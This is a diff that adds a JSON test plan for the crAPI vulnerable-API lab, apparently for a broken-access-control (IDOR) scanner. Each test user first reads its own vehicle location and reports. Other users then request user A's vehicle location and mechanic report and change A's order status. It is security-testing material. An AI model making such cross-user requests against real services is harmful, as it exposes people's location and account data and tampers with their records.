@@ -1,0 +1,18 @@
+{
+  "_comment": "Active-loop plan: each user OBSERVES its own objects, then ATTACKS the others'. Replace <...> with ids from YOUR crAPI instance. Structure is fixed; only ids are yours.",
+  "observe": [
+    {"pid": "A", "method": "GET", "path": "/identity/api/v2/user/dashboard"},
+    {"pid": "A", "method": "GET", "path": "/identity/api/v2/vehicle/<A_VEHICLE_UUID>/location"},
+    {"pid": "B", "method": "GET", "path": "/identity/api/v2/user/dashboard"},
+    {"pid": "B", "method": "GET", "path": "/identity/api/v2/vehicle/<B_VEHICLE_UUID>/location"},
+    {"pid": "C", "method": "GET", "path": "/identity/api/v2/user/dashboard"}
+  ],
+  "attack": [
+    {"pid": "B", "method": "GET", "path": "/identity/api/v2/vehicle/<A_VEHICLE_UUID>/location"},
+    {"pid": "C", "method": "GET", "path": "/identity/api/v2/vehicle/<A_VEHICLE_UUID>/location"},
+    {"pid": "B", "method": "GET", "path": "/workshop/api/mechanic/mechanic_report", "query": {"report_id": "<A_REPORT_ID>"}},
+    {"pid": "C", "method": "GET", "path": "/workshop/api/mechanic/mechanic_report", "query": {"report_id": "<A_REPORT_ID>"}},
+    {"pid": "B", "method": "GET", "path": "/community/api/v2/community/posts/recent"},
+    {"pid": "B", "method": "POST", "path": "/workshop/api/shop/orders/<A_ORDER_ID>", "body": {"status": "returned"}}
+  ]
+}
